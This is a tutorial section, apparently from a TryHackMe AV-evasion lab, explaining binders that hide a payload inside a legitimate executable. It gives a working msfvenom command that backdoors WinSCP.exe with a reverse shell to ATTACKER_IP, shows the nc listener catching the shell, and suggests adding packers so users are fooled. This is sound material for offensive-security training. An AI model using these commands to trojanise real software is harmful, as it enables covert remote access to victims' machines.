# Binders

While not an AV bypass method, binders are important when designing a malicious payload to distribute to end users. A **binder** is a program that merges two (or more) executables into a single one. It is often used to distribute your payload hidden inside another known program, fooling users into believing they are executing a legitimate application.

While each binder may work slightly differently, they generally add your shellcode's code inside the legitimate program and ensure it is executed. For example, you could change the entry point in the PE header so your shellcode runs before the legitimate program, then redirect execution back to the original program once your code finishes. This way, when the user runs the executable, your shellcode executes silently first, then the legitimate program continues as normal.

## Binding with msfvenom

You can easily plant a payload of your choice in any `.exe` file with `msfvenom`. The binary will still work as usual but will also execute an additional payload silently. The method used by `msfvenom` injects your malicious program by creating an extra thread for it, which is slightly different from the entry point method but achieves the same result. Having a separate thread is even better, as your program won't get blocked if your shellcode fails.

For this task, we will backdoor the WinSCP executable located at `C:\Tools\WinSCP`.

To create a backdoored `WinSCP.exe`, use the following command on your Windows machine:

> **Note:** Metasploit is installed on the Windows machine for your convenience, but it might take up to three minutes to generate the payload (any warnings can be safely ignored).

```shell
C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
```

The resulting `WinSCP-evil.exe` will execute a `reverse_tcp` meterpreter payload without the user noticing. Before running the backdoored executable, set up an `nc` listener to receive the reverse shell. When you execute your backdoored executable, it should launch a reverse shell back to you while continuing to execute `WinSCP.exe` for the user:

```shell
user@attackbox$ nc -lvp 7779      
Listening on 0.0.0.0 7779
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Binders and AV

Binders do little to hide your payload from AV solutions. Simply joining two executables without any changes means the resulting executable will still trigger any signature that the original payload did.

The main use of binders is to fool users into believing they are executing a legitimate executable rather than a malicious payload.

When creating a real payload, you may want to use encoders, crypters, or packers to hide your shellcode from signature-based AVs, and then bind it into a known executable so the user doesn't know what is being executed.

Feel free to try uploading your bound executable to the THM Antivirus Check website (link available on your desktop) without any packing. You should get a detection back from the server, so this method alone won't help you get the flag from the server.

